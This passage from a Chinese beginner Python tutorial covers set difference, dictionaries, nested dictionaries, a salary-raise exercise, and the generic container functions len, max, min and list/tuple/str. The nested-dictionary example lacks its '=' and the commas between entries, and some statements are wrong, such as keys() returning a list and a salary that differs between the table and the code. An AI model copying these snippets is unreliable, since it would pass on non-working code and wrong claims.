class="number">3</span>,<span class="number">4</span>&#125;</span><br><span class="line"></span><br><span class="line">set3 = set1.difference(set2)</span><br><span class="line"><span class="built_in">print</span>(set3)</span><br></pre></td></tr></table></figure><p>输出结果如下：<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;1&#125;</span><br></pre></td></tr></table></figure><p>可以看到，<code>set3</code>中只包含了<code>set1</code>中不在<code>set2</code>中的元素<code>1</code></p><h4 id="去除差集"><a href="#去除差集" class="headerlink" title="去除差集"></a><span style="font-size: 24px; font-weight: bold;">去除差集</span><br></h4><p>语法：<code>集合1.difference_update(集合2)</code><br><br>功能：修改<code>集合1</code>，删除其中和<code>集合2</code>内相同的元素<br><br>下面是示例：<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">set1 = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;</span><br><span class="line">set2 = &#123;<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>&#125;</span><br><span class="line"></span><br><span class="line">set1.difference_update(set2)</span><br><span class="line"><span class="built_in">print</span>(set1)</span><br></pre></td></tr></table></figure><p>输出结果如下：<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;1&#125;</span><br></pre></td></tr></table></figure><p>去除了<code>集合1</code>中和<code>集合2</code>重复的元素，并将<code>集合1</code>中独有的元素保留下来</p><h1 id="数据容器：dict（字典）"><a href="#数据容器：dict（字典）" class="headerlink" title="数据容器：dict（字典）"></a>数据容器：dict（字典）</h1><p>生活中，我们会用到字典，其主要使用方法是通过<code>字</code>来查询<code>字的含义</code>，在python中，字典也是这样的，只不过是通过<code>关键字</code>key查询<code>值</code>value<br></p><h2 id="字典的定义"><a href="#字典的定义" class="headerlink" title="字典的定义"></a>字典的定义</h2><p>语法如下：<code>&#123;关键字:值,关键字:值,关键字:值&#125;</code><br><br>下面是示例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">my_dict = &#123;<span class="string">&#x27;apple&#x27;</span>: <span class="string">&#x27;苹果&#x27;</span>, <span class="string">&#x27;banana&#x27;</span>: <span class="string">&#x27;香蕉&#x27;</span>, <span class="string">&#x27;orange&#x27;</span>: <span class="string">&#x27;橙子&#x27;</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(my_dict[<span class="string">&#x27;apple&#x27;</span>])</span><br></pre></td></tr></table></figure><p>输出结果如下：<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">苹果</span><br></pre></td></tr></table></figure><p>可以看到，通过<code>apple</code>查询到了<code>苹果</code><br><br>尽管，<span style="color:red">字典中不允许重复的关键字存在</span>，但是，如果我们将<code>关键字</code> <code>apple</code>重复一次，并赋上不同的<code>值</code>，会发生什么呢？<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">my_dict = &#123;<span class="string">&#x27;apple&#x27;</span>: <span class="string">&#x27;小苹果&#x27;</span>, <span class="string">&#x27;apple&#x27;</span>: <span class="string">&#x27;大苹果&#x27;</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(my_dict[<span class="string">&#x27;apple&#x27;</span>])</span><br></pre></td></tr></table></figure><p>输出结果如下：<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">大苹果</span><br></pre></td></tr></table></figure><p>可以看到，如果在字典里有<strong>两个相同的关键字</strong>，查询时会显示<strong>最后一个</strong>关键字的值<br></p><h2 id="嵌套字典"><a href="#嵌套字典" class="headerlink" title="嵌套字典"></a>嵌套字典</h2><p>现在出现了一个问题，假如我需要做一个成绩统计的程序，该怎么办呢？<br><br><img src="https://free.picui.cn/free/2025/06/21/68564fbf5a5ca.png" alt="成绩"><br><br>一个字典可以表示张三、李四、王五，或者表示语文、数学、英语的成绩，但是想把姓名和成绩联系起来就会有点困难了，此时，我们可以使用嵌套字典，下面是示例：<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在 姓名 的字典中，嵌套一个 分数 的字典</span></span><br><span class="line">stu_score&#123;</span><br><span class="line">    <span class="string">&quot;张三&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;语文&quot;</span>:<span class="number">96</span></span><br><span class="line">        <span class="string">&quot;数学&quot;</span>:<span class="number">86</span></span><br><span class="line">        <span class="string">&quot;英语&quot;</span>:<span class="number">76</span></span><br><span class="line">    &#125;,</span><br><span class="line">        <span class="string">&quot;李四&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;语文&quot;</span>:<span class="number">86</span></span><br><span class="line">        <span class="string">&quot;数学&quot;</span>:<span class="number">76</span></span><br><span class="line">        <span class="string">&quot;英语&quot;</span>:<span class="number">66</span></span><br><span class="line">    &#125;,</span><br><span class="line">        <span class="string">&quot;王五&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;语文&quot;</span>:<span class="number">76</span></span><br><span class="line">        <span class="string">&quot;数学&quot;</span>:<span class="number">66</span></span><br><span class="line">        <span class="string">&quot;英语&quot;</span>:<span class="number">56</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此时，我们已经创立好了一个嵌套字典，但是该怎么调出某个学生对应的分数呢？<br><br>这里我们以<code>张三 の 语文</code>为例<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(stu_score[<span class="string">&quot;张三&quot;</span>][<span class="string">&quot;语文&quot;</span>])        <span class="comment"># 语法：字典名[外层关键字][内层关键字]</span></span><br></pre></td></tr></table></figure><p>输出结果如下：<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">96</span><br></pre></td></tr></table></figure><p>可以看到，通过嵌套调用的方式，成功的调出了张三的语文成绩<br></p><blockquote><p>注意！<span style="color:red">嵌套字典只能出现在<code>value</code>中，不能出现在<code>key</code>中</span></p></blockquote><h2 id="字典的常用操作"><a href="#字典的常用操作" class="headerlink" title="字典的常用操作"></a>字典的常用操作</h2><h3 id="新增元素、更新元素"><a href="#新增元素、更新元素" class="headerlink" title="新增元素、更新元素"></a>新增元素、更新元素</h3><p>语法：<code>字典[key] = value</code><br><br>若<code>[key]</code>在原字典中不存在，则新建一个<code>key : value</code><br><br>若<code>[key]</code>在原字典中存在，则使<code>key : value</code>覆盖<code>[key]</code>对应的原始数据<br><br>示例代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">my_dict = &#123;<span class="string">&#x27;apple&#x27;</span>: <span class="string">&#x27;苹果&#x27;</span>, <span class="string">&#x27;banana&#x27;</span>: <span class="string">&#x27;香蕉&#x27;</span>, <span class="string">&#x27;orange&#x27;</span>: <span class="string">&#x27;橙子&#x27;</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;更新前：&quot;</span>,my_dict)</span><br><span class="line">my_dict[<span class="string">&#x27;apple&#x27;</span>] = <span class="string">&#x27;小苹果&#x27;</span>     <span class="comment"># 用 apple:小苹果 覆盖 apple:苹果</span></span><br><span class="line">my_dict[<span class="string">&#x27;peach&#x27;</span>] = <span class="string">&#x27;桃子&#x27;</span>      <span class="comment"># 创建 peach:桃子</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;更新后：&quot;</span>,my_dict)</span><br></pre></td></tr></table></figure><p>输出结果如下：<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">更新前： &#123;&#x27;apple&#x27;: &#x27;苹果&#x27;, &#x27;banana&#x27;: &#x27;香蕉&#x27;, &#x27;orange&#x27;: &#x27;橙子&#x27;&#125;</span><br><span class="line">更新后： &#123;&#x27;apple&#x27;: &#x27;小苹果&#x27;, &#x27;banana&#x27;: &#x27;香蕉&#x27;, &#x27;orange&#x27;: &#x27;橙子&#x27;, &#x27;peach&#x27;: &#x27;桃子&#x27;&#125;</span><br></pre></td></tr></table></figure><h3 id="删除元素"><a href="#删除元素" class="headerlink" title="删除元素"></a>删除元素</h3><p>语法：<code>字典.pop(key)</code><br><br>功能：删除<code>key</code>对应的<code>键值对</code><br><br>下面是示例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">my_dict = &#123;<span class="string">&#x27;apple&#x27;</span>: <span class="string">&#x27;小苹果&#x27;</span>, <span class="string">&#x27;banana&#x27;</span>: <span class="string">&#x27;香蕉&#x27;</span>, <span class="string">&#x27;orange&#x27;</span>: <span class="string">&#x27;橙子&#x27;</span>, <span class="string">&#x27;peach&#x27;</span>: <span class="string">&#x27;桃子&#x27;</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;删除前：&quot;</span>,my_dict)</span><br><span class="line">my_dict.pop(<span class="string">&#x27;apple&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;删除后：&quot;</span>,my_dict)</span><br></pre></td></tr></table></figure><p>输出结果如下：<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">删除前： &#123;&#x27;apple&#x27;: &#x27;小苹果&#x27;, &#x27;banana&#x27;: &#x27;香蕉&#x27;, &#x27;orange&#x27;: &#x27;橙子&#x27;, &#x27;peach&#x27;: &#x27;桃子&#x27;&#125;</span><br><span class="line">删除后： &#123;&#x27;banana&#x27;: &#x27;香蕉&#x27;, &#x27;orange&#x27;: &#x27;橙子&#x27;, &#x27;peach&#x27;: &#x27;桃子&#x27;&#125;</span><br></pre></td></tr></table></figure><h3 id="删除所有元素"><a href="#删除所有元素" class="headerlink" title="删除所有元素"></a>删除所有元素</h3><p>语法：<code>字典.clear()</code><br><br>功能：删除字典中的所有元素<br><br>下面是示例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">my_dict = &#123;<span class="string">&#x27;apple&#x27;</span>: <span class="string">&#x27;小苹果&#x27;</span>, <span class="string">&#x27;banana&#x27;</span>: <span class="string">&#x27;香蕉&#x27;</span>, <span class="string">&#x27;orange&#x27;</span>: <span class="string">&#x27;橙子&#x27;</span>, <span class="string">&#x27;peach&#x27;</span>: <span class="string">&#x27;桃子&#x27;</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;删除前：&quot;</span>,my_dict)</span><br><span class="line">my_dict.clear()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;删除后：&quot;</span>,my_dict)</span><br></pre></td></tr></table></figure><p>输出结果如下：<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">删除前： &#123;&#x27;apple&#x27;: &#x27;小苹果&#x27;, &#x27;banana&#x27;: &#x27;香蕉&#x27;, &#x27;orange&#x27;: &#x27;橙子&#x27;, &#x27;peach&#x27;: &#x27;桃子&#x27;&#125;</span><br><span class="line">删除后： &#123;&#125;</span><br></pre></td></tr></table></figure><h3 id="获取所有键"><a href="#获取所有键" class="headerlink" title="获取所有键"></a>获取所有键</h3><p>语法：<code>字典.keys()</code><br><br>功能：返回一个包含字典所有<code>key</code>的列表<br><br>下面是示例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">my_dict = &#123;<span class="string">&#x27;apple&#x27;</span>: <span class="string">&#x27;小苹果&#x27;</span>, <span class="string">&#x27;banana&#x27;</span>: <span class="string">&#x27;香蕉&#x27;</span>, <span class="string">&#x27;orange&#x27;</span>: <span class="string">&#x27;橙子&#x27;</span>, <span class="string">&#x27;peach&#x27;</span>: <span class="string">&#x27;桃子&#x27;</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;所有键：&quot;</span>,my_dict.keys())</span><br></pre></td></tr></table></figure><p>输出结果如下：<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">所有键： dict_keys([&#x27;apple&#x27;, &#x27;banana&#x27;, &#x27;orange&#x27;, &#x27;peach&#x27;])</span><br></pre></td></tr></table></figure><h3 id="遍历字典"><a href="#遍历字典" class="headerlink" title="遍历字典"></a>遍历字典</h3><p>由于字典不支持下标索引，无法使用<code>while循环</code>遍历，具有和<code>集合</code>相同的性质【<a href="#%E9%81%8D%E5%8E%86">点击转跳</a>】<br></p><h3 id="获取所有值"><a href="#获取所有值" class="headerlink" title="获取所有值"></a>获取所有值</h3><p>老朋友<code>len()</code>，看上面的列表吧【<a href="#len-list">点击转跳</a>】<br></p><h2 id="程序实战-1"><a href="#程序实战-1" class="headerlink" title="程序实战"></a>程序实战</h2><p>有如下员工信息，请使用字典完成数据的记录<br><br>并通过for循环，对所有级别为1级的员工，级别上升1级，薪水增加1000元<br></p><table><thead><tr><th>姓名</th><th>部门</th><th>工资</th><th>级别</th></tr></thead><tbody><tr><td>张三</td><td>科技部</td><td>3000</td><td>1</td></tr><tr><td>李四</td><td>市场部</td><td>5000</td><td>2</td></tr><tr><td>王五</td><td>市场部</td><td>7000</td><td>3</td></tr><tr><td>赵六</td><td>科技部</td><td>4000</td><td>1</td></tr></tbody></table><p>流程图：<br><img src="https://free.picui.cn/free/2025/06/21/68568b5bbbbe5.png" alt="升职加薪流程图"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建雇员字典</span></span><br><span class="line">emp_dict=&#123;</span><br><span class="line">    <span class="string">&quot;张三&quot;</span>:[<span class="string">&quot;科技部&quot;</span>,<span class="number">3000</span>,<span class="number">1</span>],</span><br><span class="line">    <span class="string">&quot;李四&quot;</span>:[<span class="string">&quot;市场部&quot;</span>,<span class="number">5000</span>,<span class="number">2</span>],</span><br><span class="line">    <span class="string">&quot;王五&quot;</span>:[<span class="string">&quot;市场部&quot;</span>,<span class="number">7000</span>,<span class="number">3</span>],</span><br><span class="line">    <span class="string">&quot;赵六&quot;</span>:[<span class="string">&quot;科技部&quot;</span>,<span class="number">3000</span>,<span class="number">1</span>]</span><br><span class="line">          &#125;</span><br><span class="line"><span class="comment"># 打印雇员字典</span></span><br><span class="line"><span class="built_in">print</span>(emp_dict)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询、判断等级</span></span><br><span class="line"><span class="keyword">for</span> name <span class="keyword">in</span> emp_dict.keys():</span><br><span class="line">    <span class="keyword">if</span> emp_dict[name][<span class="number">2</span>] == <span class="number">1</span>:</span><br><span class="line">        emp_dict[name][<span class="number">2</span>] = <span class="number">2</span>       <span class="comment"># 升职</span></span><br><span class="line">        emp_dict[name][<span class="number">1</span>] += <span class="number">1000</span>   <span class="comment"># 加薪</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 打印雇员字典</span></span><br><span class="line"><span class="built_in">print</span>(emp_dict)</span><br></pre></td></tr></table></figure><h1 id="数据容器的通用操作"><a href="#数据容器的通用操作" class="headerlink" title="数据容器的通用操作"></a>数据容器的通用操作</h1><h2 id="遍历-1"><a href="#遍历-1" class="headerlink" title="遍历"></a>遍历</h2><ul><li>五类数据容器<code>列表</code>、<code>元组</code>、<code>集合</code>、<code>字典</code>、<code>字符串</code>都支持<code>for循环</code>遍历</li><li><code>列表``元组``字符串</code>支持<code>while循环</code>，<code>字典</code>、<code>集合</code>由于没有下标索引，无法使用<code>while循环</code></li></ul><h2 id="通用统计操作"><a href="#通用统计操作" class="headerlink" title="通用统计操作"></a>通用统计操作</h2><p><code>len</code>、<code>max</code>、<code>min</code><br></p><h3 id="len-容器-：输出容器的大小"><a href="#len-容器-：输出容器的大小" class="headerlink" title="len(容器)：输出容器的大小"></a><code>len(容器)</code>：输出容器的大小<br></h3><p>示例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">my_list = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>]</span><br><span class="line">my_tuple = (<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>)</span><br><span class="line">my_set = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>&#125;</span><br><span class="line">my_dict = &#123;<span class="string">&#x27;apple&#x27;</span>: <span class="string">&#x27;苹果&#x27;</span>, <span class="string">&#x27;banana&#x27;</span>: <span class="string">&#x27;香蕉&#x27;</span>, <span class="string">&#x27;orange&#x27;</span>: <span class="string">&#x27;橙子&#x27;</span>&#125;</span><br><span class="line">my_str = <span class="string">&quot;12345&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;列表的长度为：&quot;</span>,<span class="built_in">len</span>(my_list))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;元组的长度为：&quot;</span>,<span class="built_in">len</span>(my_tuple))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;集合的长度为：&quot;</span>,<span class="built_in">len</span>(my_set))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;字典的长度为：&quot;</span>,<span class="built_in">len</span>(my_dict))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;字符串的长度为：&quot;</span>,<span class="built_in">len</span>(my_str))</span><br></pre></td></tr></table></figure><p>输出结果如下：<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">列表的长度为： 5</span><br><span class="line">元组的长度为： 5</span><br><span class="line">集合的长度为： 5</span><br><span class="line">字典的长度为： 3</span><br><span class="line">字符串的长度为： 5</span><br></pre></td></tr></table></figure><h3 id="max-容器-：输出容器中的最大值"><a href="#max-容器-：输出容器中的最大值" class="headerlink" title="max(容器)：输出容器中的最大值"></a><code>max(容器)</code>：输出容器中的最大值<br></h3><p>示例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">my_list = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>]</span><br><span class="line">my_tuple = (<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>)</span><br><span class="line">my_set = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>&#125;</span><br><span class="line">my_dict = &#123;<span class="string">&#x27;apple&#x27;</span>: <span class="string">&#x27;苹果&#x27;</span>, <span class="string">&#x27;banana&#x27;</span>: <span class="string">&#x27;香蕉&#x27;</span>, <span class="string">&#x27;orange&#x27;</span>: <span class="string">&#x27;橙子&#x27;</span>&#125;</span><br><span class="line">my_str = <span class="string">&quot;12345&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;列表的最大值为：&quot;</span>,<span class="built_in">max</span>(my_list))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;元组的最大值为：&quot;</span>,<span class="built_in">max</span>(my_tuple))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;集合的最大值为：&quot;</span>,<span class="built_in">max</span>(my_set))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;字典的最大值为：&quot;</span>,<span class="built_in">max</span>(my_dict))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;字符串的最大值为：&quot;</span>,<span class="built_in">max</span>(my_str))</span><br></pre></td></tr></table></figure><p>输出结果如下：<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">列表的最大值为： 5</span><br><span class="line">元组的最大值为： 5</span><br><span class="line">集合的最大值为： 5</span><br><span class="line">字典的最大值为： orange</span><br><span class="line">字符串的最大值为： 5</span><br></pre></td></tr></table></figure><h3 id="min-容器-：输出容器中的最小值"><a href="#min-容器-：输出容器中的最小值" class="headerlink" title="min(容器)：输出容器中的最小值"></a><code>min(容器)</code>：输出容器中的最小值<br></h3><p>示例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">my_list = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>]</span><br><span class="line">my_tuple = (<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>)</span><br><span class="line">my_set = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>&#125;</span><br><span class="line">my_dict = &#123;<span class="string">&#x27;apple&#x27;</span>: <span class="string">&#x27;苹果&#x27;</span>, <span class="string">&#x27;banana&#x27;</span>: <span class="string">&#x27;香蕉&#x27;</span>, <span class="string">&#x27;orange&#x27;</span>: <span class="string">&#x27;橙子&#x27;</span>&#125;</span><br><span class="line">my_str = <span class="string">&quot;12345&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;列表的最小值为：&quot;</span>,<span class="built_in">min</span>(my_list))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;元组的最小值为：&quot;</span>,<span class="built_in">min</span>(my_tuple))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;集合的最小值为：&quot;</span>,<span class="built_in">min</span>(my_set))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;字典的最小值为：&quot;</span>,<span class="built_in">min</span>(my_dict))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;字符串的最小值为：&quot;</span>,<span class="built_in">min</span>(my_str))</span><br></pre></td></tr></table></figure><p>输出结果如下：<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">列表的最小值为： 1</span><br><span class="line">元组的最小值为： 1</span><br><span class="line">集合的最小值为： 1</span><br><span class="line">字典的最小值为： apple</span><br><span class="line">字符串的最小值为： 1</span><br></pre></td></tr></table></figure><h2 id="容器的通用转换功能"><a href="#容器的通用转换功能" class="headerlink" title="容器的通用转换功能"></a>容器的通用转换功能</h2><p><code>list(容器)</code>将给定容器转换为列表<br><br><code>tuple(容器)</code>将给定容器转换为元组<br><br><code>str(容器)</code>将给定容器转换为字符串<br><br><code>set(容器)</code>将给定容器转换为集合<br></p><h3 id="list"><a href="#list" class="headerlink" title="list"></a>list</h3><p><code>list(容器)</code>将给定容器转换为列表<br><br>功能：将给定容器转换为列表<br></p><blockquote><p>注意！在将<code>字符串</code>和<code>字典</code>转化为列表的时候，每一个字符都是单独的一个元素，字典只保留key，不保留value</p></blockquote><p>示例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">my_str = <span class="string">&quot;12345&quot;</span></span><br><span class="line">my_dict = &#123;<span class="string">&#x27;apple&#x27;</span>: <span class="string">&#x27;苹果&#x27;</span>, <span class="string">&#x27;banana&#x27;</span>: <span class="string">&#x27;香蕉&#x27;</span>, <span class="string">&#x27;orange&#x27;</span>: <span class="string">&#x27;橙子&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;字符串转换为列表：&quot;</span>,<span class="built_in">list</span>(my_str))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;字典转换为列表：&quot;</span>,<span class="built_in">list</span>(my_dict))</span><br></pre></td></tr></table></figure><p>输出结果如下：<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">字符串转换为列表： [&#x27;1&#x27;, &#x27;2&#x27;, &#x27;3&#x27;, &#x27;4&#x27;, &#x27;5&#x27;]</span><br><span class="line">字典转换为列表： [&#x27;apple&#x27;, &#x27;banana&#x27;, &#x27;orange&#x27;]</span><br></pre></td></tr></table></figure><h3 id="tuple"><a href="#tuple" class="headerlink" title="tuple"></a>tuple</h3><p><code>tuple(容器)</code>将给定容器转换为元组<br><br>功能：将给定容器转换为元组<br></p><blockquote><p>注意！在将<code>字符串</code>和<code>字典</code>转化为元组的时候，每一个字符都是单独的一个元素，字典只保留key，不保留value<br>示例：</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">my_str = <span class="string">&quot;12345&quot;</span></span><br><span class="line">my_dict = &#123;<span class="string">&#x27;apple&#x27;</span>: <span class="string">&#x27;苹果&#x27;</span>, <span class="string">&#x27;banana&#x27;</span>: <span class="string">&#x27;香蕉&#x27;</span>, <span class="string">&#x27;orange&#x27;</span>: <span class="string">&#x27;橙子&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;字符串转换为元组：&quot;</span>,<span class="built_in">tuple</span>(my_str))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;字典转换为元组：&quot;</span>,<span class="built_in">tuple</span>(my_dict))</span><br></pre></td></tr></table></figure><p>输出结果如下：<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">字符串转换为元组： (&#x27;1&#x27;, &#x27;2&#x27;, &#x27;3&#x27;, &#x27;4&#x27;, &#x27;5&#x27;)</span><br><span class="line">字典转换为元组： (&#x27;apple&#x27;, &#x27;banana&#x27;, &#x27;orange&#x27;)</span><br></pre></td></tr></table></figure><h3 id="str"><a href="#str" class="headerlink" title="str"></a>str</h3><p><code>str(容器)</code>将给定容器转换为字符串<br><br>功能：将给定容器转换为字符串<br><br>示例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">my_list = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>]</span><br><span class="line">my_tuple = (<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>)</span><br><span class="line">my_set = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>&#125;</span><br><span class="line">my_dict = &#123;<span class="string">&#x27;apple&#x27;</span>: <span class="string">&#x27;苹果&#x27;</span>, <span class="string">&#x27;banana&#x27;</span>: <span class="string">&#x27;香蕉&#x27;</span>, <span class="string">&#x27;orange&#x27;</span>: <span class="string">&#x27;橙子&#x27;</span>&#125;</span><br><span class="line">my_str = <span class="string">&quot;12345&quot;</span></span><br><span class="line"></span><br><span class="line"><span 